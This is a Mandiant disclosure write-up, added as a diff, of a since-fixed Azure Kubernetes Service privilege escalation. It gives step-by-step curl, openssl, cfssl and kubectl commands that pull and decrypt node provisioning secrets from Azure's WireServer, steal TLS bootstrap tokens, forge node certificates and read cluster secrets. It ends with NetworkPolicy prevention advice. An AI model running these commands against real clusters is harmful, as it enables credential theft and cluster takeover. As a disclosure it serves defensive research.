@@ -1,0 +1,132 @@
+Mandiant
+Written by: Nick McClendon, Daniel McNamara, Jacob Paullus
+Executive Summary
+- Mandiant disclosed this vulnerability to Microsoft via the Microsoft Security Response Center (MSRC) vulnerability disclosure program, and Microsoft has fixed the underlying issue.
+- An attacker with access to a vulnerable Microsoft Azure Kubernetes Services cluster could have escalated privileges and accessed credentials for services used by the cluster.
+- Attackers that exploited this issue could gain access to sensitive information, resulting in data theft, financial loss, reputation harm, and other impacts.
+Introduction
+Kubernetes can be difficult to harden. Enforcing authentication for internal services, applying granular NetworkPolicies, and restricting unsafe workloads with Pod Security are now table stakes for preventing post-exploitation activity that can compromise an entire cluster. These security configurations that limit attack surface help prevent against known and unknown attacks alike.
+Azure Kubernetes Services clusters using "Azure CNI" for the "Network configuration" and "Azure" for the "Network Policy" were affected by this privilege escalation vulnerability. An attacker with command execution in a Pod running within an affected Azure Kubernetes Services cluster could download the configuration used to provision the cluster node, extract the transport layer security (TLS) bootstrap tokens, and perform a TLS bootstrap attack to read all secrets within the cluster. This attack did not require the Pod to be running with hostNetwork
+set to true
+and does not require the Pod to be running as root
+.
+Mandiant disclosed this vulnerability to Microsoft via the MSRC vulnerability disclosure program, and Microsoft has fixed the underlying issue.
+Background
+Cluster Network Access
+Kubernetes clusters are often deployed without consideration for the possibility of an attacker with code execution within a Pod. This can happen in many ways, including via existing vulnerabilities in running workloads, continuous integration build jobs, or a compromised developer account. In these scenarios, NetworkPolicies are the first line of defense to prevent post-exploitation activity.
+Without NetworkPolicies in place, you should assume a compromised Pod can access any network resource any other Pod on the cluster can access. This could include the local Redis cache for another Pod, managed databases running in your cloud provider, or even your on-premises network. When these services require authentication and are configured correctly, this is a relatively low-risk configuration —a vulnerability in one of these services would be necessary for an attacker to exploit.
+Often overlooked among these accessible services are the internal cloud services used to configure the worker nodes on which these Pods are running. The metadata server, accessible at http://169.254.169.254 across cloud providers, provides machine configuration and often the credentials used to identify the machine to the cloud provider. Generally speaking, direct access to the metadata server is equivalent to having the same permissions the machine does.
+Metadata server attacks are not new and cloud providers do a lot to limit their attack surface by default. Most cloud providers do a combination of recommending NetworkPolicies to block access to 169.254.0.0/16
+, limiting the default privileges assigned to worker nodes, and providing alternatives to allow Pods to have their own credentials separate from the instance they're running on.
+Bootstrapping Kubernetes Nodes
+The difficulty in bootstrapping trust in Kubernetes Nodes is well known among the Kubernetes security community. The kubelet that runs on Kubernetes Nodes needs a TLS certificate signed by the control plane Certificate Authority (CA) to operate safely. But in a large distributed system where nodes (or virtual machines [VMs]) are constantly created and destroyed, how should that certificate be provisioned onto the VM? One option on cloud services is to use the metadata server, accessible at http://169.254.169.254 across cloud providers, to deliver a static token to provisioned VMs that can be used to prove the VM should be part of the cluster and issued a kubelet certificate.
+The problem with that approach is that these metadata services are network accessible and could cause theft of the token if the attacker has network access, such as through a server-side request forgery (SSRF) vulnerability. The Google Kubernetes Engine (GKE) security team presented about this style of attack with Shopify at Kubecon in 2018. With possession of these bootstrap tokens, an attacker can create a kubelet certificate for their own machine and use those credentials to attack the control plane, steal secrets, and interfere with the workloads scheduled on their malicious "node."
+While protecting these tokens by denying applications access to the metadata server can help, the managed Kubernetes industry has evolved beyond simple token provisioning as a means for identifying VMs for critical security decisions.
+Taking GKE as an example, we can see this evolution happening. GKE first protected clusters against these kinds of bootstrap token-stealing attacks in February 2018 with the launch of the metadata concealment proxy, which was presented at Kubecon that year. That temporary solution was replaced in September 2019 with a cryptographically verifiable virtual Trusted Platform Module (vTPM)-backed trust bootstrap process that operates as part of shielded nodes. Shielded nodes have been enabled by default for all newly created GKE clusters since January 2021. It is enabled for all GKE Autopilot clusters and cannot be disabled.
+GKE shielded nodes remove the risk of bootstrap token theft instead of concealing it. Instead of relying on possession of a static token to authenticate and authorize a request for a new kubelet certificate, the VM requests an attestation from the VM's vTPM, which is then verified by the control plane before issuing the kubelet certificate. Generating this attestation requires the attacker to have access to a root-owned device on the VM, which is a significantly higher bar than network access to the metadata server. Even with that access, the attacker can only generate an attestation for that node, not any node in the cluster. A new attestation will need to be produced to obtain a new kubelet certificate when the existing one expires, requiring the attacker to maintain presence on the node.
+Azure WireServer and the HostGAPlugin
+Azure WireServer is an undocumented component of Azure used internally by the platform for several reasons. At the time of writing, the best official resource for the WireServer's functionality is Azure's WALinuxAgent repository, which handles provisioning of Linux instances and interactions with Azure Fabric.
+CyberCX published research in May 2023 that included an interesting attack path with the undocumented HostGAPlugin. Given access to the WireServer (http://168.63.129.16/machine/?comp=goalstate
+) and HostGAPlugin (http://168.63.129.16:32526/vmSettings
+) endpoint, an attacker could retrieve and decrypt the settings provided to a number of extensions, including the "Custom Script Extension," a service used to provide a virtual machine its initial configuration.
+Vulnerability Exploitation
+Recovering TLS Bootstrap Tokens
+Following the process documented by CyberCX, the key used to encrypt protected settings values can be requested from the WireServer. The commands to generate wireserver.key
+have been copied as follows from their original blog post for completeness.
+openssl req -x509 -nodes -subj "/CN=LinuxTransport" -days 730
+-newkey rsa:2048 -keyout temp.key -outform DER -out temp.crt
+CERT_URL=$(curl 'http://168.63.129.16/machine/?comp=goalstate'
+-H 'x-ms-version: 2015-04-05' -s | grep -oP
+'(?<=Certificates>).+(?=</Certificates>)' | recode html..ascii)
+curl $CERT_URL -H 'x-ms-version: 2015-04-05' -H
+"x-ms-guest-agent-public-x509-cert: $(base64 -w0 ./temp.crt)" -s |
+grep -Poz '(?<=<Data>)(.*\n)*.*(?=</Data>)' | base64 -di > payload.p7m
+openssl cms -decrypt -inform DER -in payload.p7m -inkey
+./temp.key -out payload.pfx
+openssl pkcs12 -nodes -in payload.pfx -password pass:
+-out wireserver.key
+When performed correctly, the TenantEncryptionCert key will be written to wireserver.key
+.
+Figure 1: Expected key attributes for wireserver.key
+The JSON document returned from the HostGAPlugin can be roughly parsed to remove null
+values and Base64 decoded to produce the encrypted blob (protected_settings.bin
+) containing the script used to provision the machine.
+curl -s 'http://168.63.129.16:32526/vmSettings' |
+jq -r.extensionGoalStates[].settings[].protectedSettings |
+grep -v null | base64 -d > protected_settings.bin
+The encrypted settings blob (protected_settings.bin
+) can then be decrypted with the previously obtained wireserver.key
+.
+openssl cms -decrypt -inform DER -in settings.bin -inkey
+./wireserver.key > settings.json
+This settings file includes a single key, commandToExecute
+, which includes the provisioning script used for the Kuberenetes nodes the Pod is running on.
+Figure 2: ProtectedSettings configuration for commandToExecute
+The provisioning script appears to include the templated result of cse_cmd.sh
+, a provisioning script for Azure Kubernetes Service nodes. This provisioning script includes a number of secrets included as environment variables, with the ones used for privilege escalation documented as follows.
+KUBELET_CLIENT_CONTENT
+, KUBELET_CLIENT_CERT_CONTENT
+, and KUBELET_CA_CRT
+can be Base64 decoded and written to disk to use with the Kubernetes command-line tool kubectl
+to authenticate to the cluster. This account has minimal Kubernetes permissions in recently deployed Azure Kubernetes Service (AKS) clusters, but it can notably list nodes in the cluster.
+Figure 3: Permissions granted to the embedded TLS certificates
+TLS_BOOTSTRAP_TOKEN
+can be provided directly to authentication with kubectl
+and can read and create ClientSigningRequests (CSR), enabling a TLS bootstrap attack, similar to the 2018 attack described by 4Armed on GKE that was preventable by using the GKE metadata concealment feature at the time, and later prevented by default on GKE with Shielded Nodes.
+Figure 4: Permissions granted to the TLS Bootstrap token
+Recovering Active Node Certificates
+The certificates embedded in cse_cmd.sh
+can be used to list the nodes within the cluster, used in a later step to request a certificate for an active node.
+kubectl --certificate-authority ca.crt --client-certificate kubelet.crt
+--client-key kubelet.key --server https://10.0.0.1:443 get nodes
+Nodes are identified with client certificates with the Common Name system:node:<NODE NAME>
+and the Organization system:nodes
+. Following are the cfssl
+commands used to generate a certificate.
+cat <<EOF | cfssl genkey - | cfssljson -bare <NODE NAME>
+{
+"CN": "system:node:<NODE NAME>",
+"key": {
+"algo": "rsa",
+"size": 2048
+},
+"names": [
+{
+"O": "system:nodes"
+}
+]
+}
+EOF
+The CSR can be submitted to the Kubernetes API using the TLS bootstrap token included in cse_cmd.sh
+using the following kubectl
+command.
+cat <<EOF | kubectl --token=<TLS BOOTSTRAP TOKEN>
+--certificate-authority ca.crt --server https://10.0.0.1:443 apply -f -
+apiVersion: certificates.k8s.io/v1
+kind: CertificateSigningRequest
+metadata:
+name: "<NODE NAME>"
+spec:
+groups:
+- system:nodes
+request: $(cat "<NODE NAME>".csr | base64 | tr -d '\n')
+signerName: kubernetes.io/kube-apiserver-client-kubelet
+usages:
+- digital signature
+- key encipherment
+- client auth
+EOF
+Azure Kubernetes Services automatically signs CSRs submitted by TLS bootstrap tokens and generates an authentication certificate. The certificate can be requested with the following kubectl
+command.
+kubectl --token=<TLS BOOTSTRAP TOKEN> --certificate-authority ca.crt
+--server https://10.0.0.1:443 get csr <NODE NAME> -o
+jsonpath='{.status.certificate}' | base64 -d > <NODE NAME>.crt
+The obtained certificate can then be validated by using it to authenticate to the Kubernetes API with the following kubectl
+command.
+kubectl --certificate-authority ca.crt --client-certificate
+<NODE NAME>.key --client-key <NODE NAME>.crt
+--server https://10.0.0.1:443 auth can-i --list
+Figure 5: Permissions granted to the newly issued certificate
+The Node Authorizer grants permissions based on the workloads scheduled on the node, which includes the ability to read all secrets for a workload running on the node. This process can be repeated across all active nodes to gain access to all secrets used by running workloads.
+Prevention
+Adopting a process to create restrictive NetworkPolicies that allow access only to required services prevents this entire attack class. Privilege escalation via an undocumented service is prevented when the service cannot be accessed at all.
